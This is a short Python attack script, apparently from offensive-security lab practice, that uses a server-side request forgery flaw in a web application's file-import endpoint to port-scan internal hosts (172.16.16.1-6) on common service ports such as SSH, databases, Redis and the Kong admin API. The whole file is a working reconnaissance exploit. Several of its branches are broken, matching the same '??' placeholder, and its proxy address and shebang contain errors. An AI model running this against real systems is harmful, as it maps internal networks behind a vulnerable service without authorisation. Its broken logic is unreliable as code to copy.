#/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help='host/ip to target', required=True)
parser.add_argument('--timeout',help='timeout',required=False,default=3)
parser.add_argument('-v','--verbose',help='enable verbose mode',action="store_true",default=False)
#/bin/python3 /home/kali/Desktop/OSWE/ssrf_subnet_port_scanner.py -t http://apigateway:8000/files/import --timeout 2
args = parser.parse_args()

proxy = {
       'http':'http://127.0.0.1:8080',
       'https':'http://127.0.9.1:8080'
}





ports = ['22','80','443','1433','1521','3306','3389','5000','5432','5900','6379','8000','8001','8055','8080','8443','9000']
#ports = []
sub_host=['1','2','3','4','5','6']
timeout = float(args.timeout)

#8001 Kong admin api 8001
#8055 Default Directors
#5432 Default Postgres
#6379 Default Redis

#with open('/home/kali/Downloads/common-http-ports.txt','r') as f:
#    for line in f:
#        ports.append(line.strip())



for sub in sub_host:
    host="http://172.16.16." + str(sub)
    print("Trying host: {host}".format(host=host))
    for p in ports:
        try:
            r = requests.post(url=args.target, proxies=proxy, json={"url":"{host}:{port}".format(host=host,port=int(p))},timeout=timeout)

            if args.verbose:
                print("{port:0} \t {msg}".format(port=int(p),msg=r.text))
            if "You don't have permission to access this" in r.text:
                print("{port:0} \t OPEN - returned permission error, therefore valid resource".format(port=int(p)))
            elif "ECONNREFUSED" in r.text:
                print("{port:0} \t CLOSED \t {msg}".format(port=int(p),msg=r.text))
            elif "??" in r.text:
                print("{port:0} \t OPEN - returned 404".format(port=int(p)))
            elif "??" in r.text:
                print("{port:0} \t returned parse error, potientially open to non-http".format(port=int(p)))
            elif "??" in r.text:
                print("{port:0} \t socket hang up, likely non-http".format(port=int(p)))
            else:
                print("{port:0} \t {msg}".format(port=int(p),msg=r.text))
        except requests.exceptions.Timeout:
            print("{port:0} \t timerd out:".format(port=int(p)))